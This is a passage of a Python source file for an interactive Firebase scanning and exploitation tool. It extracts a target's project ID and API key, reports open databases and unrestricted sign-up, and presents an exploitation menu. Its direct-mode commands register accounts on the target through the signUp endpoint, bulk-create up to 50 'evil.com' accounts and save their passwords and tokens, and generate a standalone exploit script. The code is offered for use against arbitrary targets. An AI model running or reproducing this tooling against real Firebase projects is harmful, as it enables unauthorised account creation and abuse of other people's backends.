            # Summary and exploitation
            self._display_jwt_attack_summary(successful_attacks, original_token, jwt_analysis)
            
            # Cleanup
            if input(f"\n{Colors.BOLD}[?] Delete test user? (Y/n): {Colors.ENDC}").lower() != 'n':
                try:
                    self._delete_test_user(original_token, api_key)
                    print(f"{Colors.GREEN}[✓] Test user deleted{Colors.ENDC}")
                except Exception as e:
                    print(f"{Colors.WARNING}[!] Could not delete test user: {e}{Colors.ENDC}")

    def _get_target_input(self) -> Optional[str]:
        """Get target from user input"""
        while True:
            print(f"\n{Colors.CYAN}[*] Target Options:{Colors.ENDC}")
            print("1. Firebase Project ID (e.g., my-project-12345)")
            print("2. Firebase App URL (e.g., https://my-app.firebaseapp.com)")
            print("3. Custom domain URL (e.g., https://example.com)")
            
            target = input(f"\n{Colors.BOLD}[+] Enter target: {Colors.ENDC}").strip()
            
            if not target:
                print(f"{Colors.FAIL}[!] Target is required{Colors.ENDC}")
                if input(f"{Colors.WARNING}Try again? (Y/n): {Colors.ENDC}").lower() == 'n':
                    return None
                continue
                
            return target

    def _get_scan_options(self) -> Dict:
        """Get scanning options from user"""
        options = {}
        
        # API Key (optional)
        api_key = input(f"\n{Colors.BOLD}[+] Firebase API Key (optional, for deeper scanning): {Colors.ENDC}").strip()
        if api_key:
            options['api_key'] = api_key
            
        # Scan scope
        print(f"\n{Colors.CYAN}[*] Scan Scope:{Colors.ENDC}")
        print("1. Full scan (all components)")
        print("2. Database only (Realtime DB + Firestore)")
        print("3. Storage only")
        print("4. Authentication only")
        print("5. Custom selection")
        
        scope = input(f"\n{Colors.BOLD}[+] Select scope (1-5): {Colors.ENDC}").strip()
        
        if scope == "2":
            options['scope'] = ['database']
        elif scope == "3":
            options['scope'] = ['storage']
        elif scope == "4":
            options['scope'] = ['auth']
        elif scope == "5":
            print(f"\n{Colors.CYAN}[*] Available Tests:{Colors.ENDC}")
            tests = {
                'database': 'Realtime Database & Firestore',
                'storage': 'Firebase Storage',
                'auth': 'Authentication',
                'functions': 'Cloud Functions',
                'hosting': 'Firebase Hosting',
                'api': 'API Key Security'
            }
            
            for key, desc in tests.items():
                print(f"  {key}: {desc}")
                
            selected = input(f"\n{Colors.BOLD}[+] Select tests (comma-separated): {Colors.ENDC}").strip()
            if selected:
                options['scope'] = [t.strip() for t in selected.split(',') if t.strip() in tests]
        else:
            options['scope'] = ['all']
            
        # Threading
        if input(f"\n{Colors.BOLD}[+] Use multithreading for faster scanning? (Y/n): {Colors.ENDC}").lower() != 'n':
            options['threading'] = True
            
        # Aggressive mode
        if input(f"\n{Colors.BOLD}[+] Enable aggressive mode (more thorough but slower)? (y/N): {Colors.ENDC}").lower() == 'y':
            options['aggressive'] = True
            
        return options

    def _run_scan(self, target: str, options: Dict) -> List[Dict]:
        """Execute the security scan"""
        all_vulnerabilities = []
        
        # Extract Firebase configuration
        if not self._extract_firebase_config(target):
            print(f"{Colors.FAIL}[!] Could not extract Firebase configuration from target{Colors.ENDC}")
            return all_vulnerabilities
            
        # Set API key if provided
        if 'api_key' in options:
            self.api_key = options['api_key']
            
        # Determine what to scan
        scope = options.get('scope', ['all'])
        if 'all' in scope:
            scope = ['database', 'storage', 'auth', 'functions', 'hosting', 'api']
            
        print(f"\n{Colors.CYAN}[*] Starting Firebase Security Scan{Colors.ENDC}")
        print(f"Target: {target}")
        print(f"Project ID: {self.project_id}")
        print(f"Scope: {', '.join(scope)}")
        
        # Define scan functions
        scan_functions = {
            'database': [self._test_realtime_database, self._test_firestore],
            'storage': [self._test_storage],
            'auth': [self._test_authentication],
            'functions': [self._test_cloud_functions],
            'hosting': [self._test_hosting],
            'api': [self._test_api_keys]
        }
        
        # Execute scans
        if options.get('threading', True):
            # Multithreaded scanning
            import concurrent.futures
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                futures = []
                
                for component in scope:
                    if component in scan_functions:
                        for scan_func in scan_functions[component]:
                            futures.append(executor.submit(scan_func))
                            
                for future in concurrent.futures.as_completed(futures):
                    try:
                        vulnerabilities = future.result()
                        all_vulnerabilities.extend(vulnerabilities)
                    except Exception as e:
                        print(f"{Colors.WARNING}[!] Scan error: {e}{Colors.ENDC}")
        else:
            # Sequential scanning
            for component in scope:
                if component in scan_functions:
                    for scan_func in scan_functions[component]:
                        try:
                            vulnerabilities = scan_func()
                            all_vulnerabilities.extend(vulnerabilities)
                        except Exception as e:
                            print(f"{Colors.WARNING}[!] Error in {scan_func.__name__}: {e}{Colors.ENDC}")
                            
        return all_vulnerabilities

    def _generate_report(self, vulnerabilities: List[Dict]) -> None:
        """Generate a detailed security report with exploitation options"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║              SECURITY REPORT             ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not vulnerabilities:
            print(f"\n{Colors.GREEN}[✓] No vulnerabilities found - Firebase appears to be properly configured!{Colors.ENDC}")
            return
            
        # Group by severity
        critical = [v for v in vulnerabilities if v['severity'] == 'CRITICAL']
        high = [v for v in vulnerabilities if v['severity'] == 'HIGH']
        medium = [v for v in vulnerabilities if v['severity'] == 'MEDIUM']
        low = [v for v in vulnerabilities if v['severity'] == 'LOW']
        
        print(f"\n{Colors.BOLD}Summary:{Colors.ENDC}")
        print(f"  🔴 Critical: {len(critical)}")
        print(f"  🟠 High: {len(high)}")
        print(f"  🟡 Medium: {len(medium)}")
        print(f"  🔵 Low: {len(low)}")
        print(f"  📊 Total: {len(vulnerabilities)}")
        
        # Check for exploitable vulnerabilities
        exploitable_vulns = [v for v in vulnerabilities if v['type'] in ['Unrestricted User Registration', 'Open Realtime Database', 'Database Write Access']]
        
        if exploitable_vulns:
            print(f"\n{Colors.FAIL}🚨 EXPLOITABLE VULNERABILITIES FOUND! 🚨{Colors.ENDC}")
            print(f"   {len(exploitable_vulns)} vulnerabilities can be exploited immediately")
        
        # Detailed findings
        for severity, vulns, color in [
            ('CRITICAL', critical, Colors.FAIL),
            ('HIGH', high, Colors.WARNING),
            ('MEDIUM', medium, Colors.YELLOW),
            ('LOW', low, Colors.CYAN)
        ]:
            if vulns:
                print(f"\n{color}{'='*50}")
                print(f"{severity} SEVERITY FINDINGS")
                print(f"{'='*50}{Colors.ENDC}")
                
                for i, vuln in enumerate(vulns, 1):
                    print(f"\n{color}[{i}] {vuln['type']}{Colors.ENDC}")
                    print(f"URL: {vuln['url']}")
                    print(f"Description: {vuln['description']}")
                    print(f"Impact: {vuln['impact']}")
                    if 'evidence' in vuln:
                        print(f"Evidence: {vuln['evidence'][:100]}...")
                    if 'exploitation' in vuln:
                        print(f"{Colors.RED}Exploit: {vuln['exploitation'][:100]}...{Colors.ENDC}")
        
        # Exploitation menu
        if exploitable_vulns:
            print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
            print(f"║           EXPLOITATION MENU              ║")
            print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
            
            reg_vulns = [v for v in exploitable_vulns if 'Registration' in v['type']]
            db_vulns = [v for v in exploitable_vulns if 'Database' in v['type']]
            
            if reg_vulns:
                print(f"\n{Colors.YELLOW}[!] User Registration Exploits Available{Colors.ENDC}")
                if input(f"{Colors.BOLD}[?] Launch user registration exploitation? (y/N): {Colors.ENDC}").lower() == 'y':
                    # Use the first registration vulnerability
                    vuln = reg_vulns[0]
                    self._exploit_user_registration(vuln['url'], self.api_key)
            
            if db_vulns:
                print(f"\n{Colors.YELLOW}[!] Database Exploits Available{Colors.ENDC}")
                print("   Manual exploitation recommended for database vulnerabilities")
                for vuln in db_vulns:
                    print(f"   • {vuln['url']}")
        
        # Save report to file
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"firebase_scan_{self.project_id}_{timestamp}.json"
            
            report_data = {
                'timestamp': timestamp,
                'project_id': self.project_id,
                'api_key': self.api_key[:10] + '...' if self.api_key else None,
                'summary': {
                    'total': len(vulnerabilities),
                    'critical': len(critical),
                    'high': len(high),
                    'medium': len(medium),
                    'low': len(low),
                    'exploitable': len(exploitable_vulns)
                },
                'vulnerabilities': vulnerabilities
            }
            
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
                
            print(f"\n{Colors.GREEN}[✓] Report saved to: {filename}{Colors.ENDC}")
            
        except Exception as e:
            print(f"\n{Colors.WARNING}[!] Could not save report: {e}{Colors.ENDC}")

    def run_guided(self) -> None:
        """Interactive guided mode for Firebase scanning"""
        self._show_banner()

        while True:
            try:
                print(f"\n{Colors.CYAN}[*] Firebase Security Assessment{Colors.ENDC}")
                
                # Get target
                target = self._get_target_input()
                if not target:
                    break
                    
                # Get scan options
                options = self._get_scan_options()
                
                # Show configuration
                print(f"\n{Colors.CYAN}[*] Scan Configuration{Colors.ENDC}")
                print(f"{Colors.CYAN}=" * 40)
                print(f"Target: {target}")
                if 'api_key' in options:
                    print(f"API Key: {options['api_key'][:10]}...")
                print(f"Scope: {', '.join(options.get('scope', ['all']))}")
                print(f"Threading: {'Yes' if options.get('threading') else 'No'}")
                print(f"Aggressive: {'Yes' if options.get('aggressive') else 'No'}")
                
                # Confirm and execute
                if input(f"\n{Colors.BOLD}[+] Start scan? (Y/n): {Colors.ENDC}").lower() != 'n':
                    vulnerabilities = self._run_scan(target, options)
                    self._generate_report(vulnerabilities)
                    
                    if vulnerabilities:
                        print(f"\n{Colors.WARNING}[!] Security issues found! Review the report above.{Colors.ENDC}")
                    else:
                        print(f"\n{Colors.GREEN}[✓] No security issues detected.{Colors.ENDC}")

                # Ask for another scan
                if input(f"\n{Colors.BOLD}[?] Scan another target? (y/N): {Colors.ENDC}").lower() != 'y':
                    break

            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.ENDC}")
                break
            except Exception as e:
                print(f"{Colors.FAIL}[!] Unexpected error: {e}{Colors.ENDC}")
                import traceback
                traceback.print_exc()

    def run_direct(self) -> None:
        """Direct command execution mode"""
        self._show_banner()
        
        print(f"\n{Colors.CYAN}[*] Direct Mode - Firebase Security Commands{Colors.ENDC}")
        print(f"\n{Colors.CYAN}[*] Available Commands:{Colors.ENDC}")
        print("  scan <project-id>                    - Quick scan of project")
        print("  scan <url>                           - Scan Firebase app URL")
        print("  scan <target> --api-key <key>        - Scan with API key")
        print("  scan <target> --database-only        - Database scan only")
        print("  scan <target> --storage-only         - Storage scan only")
        print("  scan <target> --auth-only            - Authentication scan only")
        print("  scan <target> --aggressive           - Aggressive scan mode")
        print("  exploit <project-id> <api-key>       - Launch exploitation menu")
        print("  create-user <email> <password>       - Create single user (requires scan first)")
        print("  bulk-users <count>                   - Create multiple users")
        print("  generate-exploit                     - Generate standalone exploit script")
        print("  extract <url>                        - Extract Firebase config from URL")
        print("  help                                 - Show help")
        print("  examples                             - Show usage examples")
        print("  exit                                 - Exit to main menu")
        
        while True:
            try:
                command_input = input(f"\n{Colors.BOLD}firebase-scanner > {Colors.ENDC}").strip()
                
                if not command_input:
                    continue
                    
                if command_input.lower() == 'exit':
                    break
                    
                elif command_input.lower() == 'help':
                    help_info = self.get_help()
                    print(f"\n{Colors.CYAN}=== Firebase Scanner Help ==={Colors.ENDC}")
                    print(f"Description: {help_info['desc']}")
                    print(f"\nFeatures:")
                    for feature, desc in help_info['features'].items():
                        print(f"  • {feature}: {desc}")
                    print(f"\nNotes:")
                    for note in help_info['notes']:
                        print(f"  • {note}")
                
                elif command_input.lower() == 'examples':
                    print(f"\n{Colors.CYAN}[*] Usage Examples:{Colors.ENDC}")
                    examples = [
                        ('Basic project scan', 'scan my-firebase-project'),
                        ('Scan with API key', 'scan my-project --api-key AIzaSyBv...'),
                        ('Database-only scan', 'scan https://my-app.firebaseapp.com --database-only'),
                        ('Full exploitation', 'exploit my-project AIzaSyBv...'),
                        ('Create single user', 'create-user hacker@evil.com MyPassword123!'),
                        ('Create 10 users', 'bulk-users 10'),
                        ('Generate exploit script', 'generate-exploit'),
                        ('Extract config', 'extract https://example.com')
                    ]
                    
                    for i, (title, cmd) in enumerate(examples, 1):
                        print(f"\n{Colors.GREEN}{i}. {title}{Colors.ENDC}")
                        print(f"   {cmd}")
                
                elif command_input.startswith('exploit '):
                    parts = command_input[8:].split()
                    if len(parts) >= 2:
                        project_id = parts[0]
                        api_key = parts[1]
                        
                        # Set the project details
                        self.project_id = project_id
                        self.api_key = api_key
                        
                        # Launch exploitation menu
                        endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
                        self._exploit_user_registration(endpoint, api_key)
                    else:
                        print(f"{Colors.FAIL}[!] Usage: exploit <project-id> <api-key>{Colors.ENDC}")
                
                elif command_input.startswith('create-user '):
                    parts = command_input[12:].split()
                    if len(parts) >= 2 and self.api_key:
                        email = parts[0]
                        password = parts[1]
                        endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
                        
                        user_data = {
                            "email": email,
                            "password": password,
                            "returnSecureToken": True
                        }
                        
                        try:
                            response = self.session.post(endpoint, json=user_data, timeout=10)
                            if response.status_code == 200:
                                user_info = response.json()
                                print(f"{Colors.GREEN}[✓] User created: {email}{Colors.ENDC}")
                                print(f"    User ID: {user_info.get('localId', 'Unknown')}")
                                
                                # Save credentials
                                creds_file = f"firebase_user_{user_info.get('localId', 'unknown')}.json"
                                with open(creds_file, 'w') as f:
                                    json.dump({
                                        "email": email,
                                        "password": password,
                                        "user_id": user_info.get('localId'),
                                        "id_token": user_info.get('idToken'),
                                        "created_at": time.time()
                                    }, f, indent=2)
                                print(f"[✓] Credentials saved to: {creds_file}")
                            else:
                                print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
                        except Exception as e:
                            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Usage: create-user <email> <password>{Colors.ENDC}")
                        print(f"{Colors.WARNING}[!] Run a scan first to get API key{Colors.ENDC}")
                
                elif command_input.startswith('bulk-users '):
                    parts = command_input[11:].split()
                    if parts and self.api_key:
                        try:
                            count = int(parts[0])
                            if count > 50:
                                print(f"{Colors.WARNING}[!] Limiting to 50 users for safety{Colors.ENDC}")
                                count = 50
                            
                            endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
                            timestamp = int(time.time())
                            created_users = []
                            
                            print(f"{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")
                            
                            for i in range(count):
                                email = f"bulk{timestamp}_{i}@evil.com"
                                password = f"BulkPass{i}123!"
                                
                                user_data = {
                                    "email": email,
                                    "password": password,
                                    "returnSecureToken": True
                                }
                                
                                try:
                                    response = self.session.post(endpoint, json=user_data, timeout=5)
                                    if response.status_code == 200:
                                        user_info = response.json()
                                        created_users.append({
                                            "email": email,
                                            "password": password,
                                            "user_id": user_info.get('localId'),
                                            "id_token": user_info.get('idToken')
                                        })
                                        print(f"{Colors.GREEN}[✓] {email}{Colors.ENDC}")
                                    else:
                                        print(f"{Colors.FAIL}[✗] {email} - {response.status_code}{Colors.ENDC}")
                                except Exception as e:
                                    print(f"{Colors.FAIL}[✗] {email} - {e}{Colors.ENDC}")
                                
                                time.sleep(0.5)  # Rate limiting
                            
                            # Save all users
                            if created_users:
                                bulk_file = f"firebase_bulk_{timestamp}.json"
                                with open(bulk_file, 'w') as f:
                                    json.dump(created_users, f, indent=2)
                                print(f"\n{Colors.GREEN}[✓] Created {len(created_users)} users{Colors.ENDC}")
                                print(f"[✓] Saved to: {bulk_file}")
                            
                        except ValueError:
                            print(f"{Colors.FAIL}[!] Invalid count{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Usage: bulk-users <count>{Colors.ENDC}")
                        print(f"{Colors.WARNING}[!] Run a scan first to get API key{Colors.ENDC}")
                
                elif command_input.lower() == 'generate-exploit':
                    if self.project_id and self.api_key:
                        endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
                        self._generate_exploit_script(endpoint, self.api_key)
                    else:
                        print(f"{Colors.FAIL}[!] Run a scan first to get project details{Colors.ENDC}")
                
                elif command_input.startswith('extract '):
                    url = command_input[8:].strip()
                    if url:
                        print(f"{Colors.CYAN}[*] Extracting Firebase config from: {url}{Colors.ENDC}")
                        if self._extract_firebase_config(url):
                            print(f"Project ID: {self.project_id}")
                            if self.api_key:
                                print(f"API Key: {self.api_key[:10]}...")
                            if self.database_url:
                                print(f"Database URL: {self.database_url}")
                        else:
                            print(f"{Colors.FAIL}[!] Could not extract Firebase config{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] URL required{Colors.ENDC}")
                
                elif command_input.startswith('scan '):
                    parts = command_input[5:].split()
                    if not parts:
                        print(f"{Colors.FAIL}[!] Target required{Colors.ENDC}")
                        continue
                        
                    target = parts[0]
                    options = {'scope': ['all']}
                    
                    # Parse options
                    i = 1
                    while i < len(parts):
                        if parts[i] == '--api-key' and i + 1 < len(parts):
                            options['api_key'] = parts[i + 1]
                            i += 2
                        elif parts[i] == '--database-only':
                            options['scope'] = ['database']
                            i += 1
                        elif parts[i] == '--storage-only':
                            options['scope'] = ['storage']
                            i += 1
                        elif parts[i] == '--auth-only':
                            options['scope'] = ['auth']
                            i += 1
                        elif parts[i] == '--aggressive':
                            options['aggressive'] = True
                            i += 1
                        else:
                            i += 1
                    
                    # Execute scan
                    print(f"{Colors.CYAN}[*] Starting scan of: {target}{Colors.ENDC}")
                    vulnerabilities = self._run_scan(target, options)
                    self._generate_report(vulnerabilities)
                    
                else:
                    print(f"{Colors.FAIL}[!] Unknown command. Type 'help' for available commands.{Colors.ENDC}")
                    
            except KeyboardInterrupt:
                print()
                continue
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")

    def check_installation(self) -> bool:
        """Check if module dependencies are available"""
        try:
            import requests
            import json
            import re
            return True
        except ImportError:
            return False

    def _get_install_command(self, pkg_manager: str) -> List[str]:
        """Return installation commands for different package managers"""
        commands = {
            'apt': [
                "apt-get update",
                "apt-get install -y python3 python3-pip",
                "pip3 install requests"
            ],
            'yum': [
                "yum update -y",
                "yum install -y python3 python3-pip",
                "pip3 install requests"
            ],
            'dnf': [
                "dnf update -y",
                "dnf install -y python3 python3-pip",
                "pip3 install requests"
            ],
            'pacman': [
                "pacman -Sy",
                "pacman -S python python-pip --noconfirm",
                "pip install requests"
            ]
        }
        return commands.get(pkg_manager, [])

    def _get_update_command(self, pkg_manager: str) -> List[str]:
        """Return update commands"""
        return ["pip3 install --upgrade requests"]

    def _get_uninstall_command(self, pkg_manager: str) -> List[str]:
        """Return uninstallation commands"""
        return ["pip3 uninstall requests -y"]

    def _test_key_confusion(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test key confusion attacks"""
        return {'success': False, 'error': 'Key confusion attack not implemented'}

    def _test_public_key_recovery(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test public key recovery attacks"""
        return {'success': False, 'error': 'Public key recovery not implemented'}

    def _test_token_replay(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test token replay attacks"""
        return {'success': False, 'error': 'Token replay attack not implemented'}

    def _test_custom_claims_injection(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test custom claims injection"""
        return {'success': False, 'error': 'Custom claims injection not implemented'}

    def _test_header_injection(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test header parameter injection"""
        return {'success': False, 'error': 'Header injection not implemented'}

    def _test_cross_jwt_confusion(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test cross-JWT confusion attacks"""
        return {'success': False, 'error': 'Cross-JWT confusion not implemented'}

    def _test_time_based_attacks(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test time-based JWT attacks"""
        return {'success': False, 'error': 'Time-based attacks not implemented'}

# For backward compatibility
def get_tool():
    """Legacy function to get tool instance"""
    return FirebaseScannerModule()

if __name__ == "__main__":
    tool = FirebaseScannerModule()
    
    if len(sys.argv) > 1 and sys.argv[1] == "direct":
        tool.run_direct()
    else:
        tool.run_guided()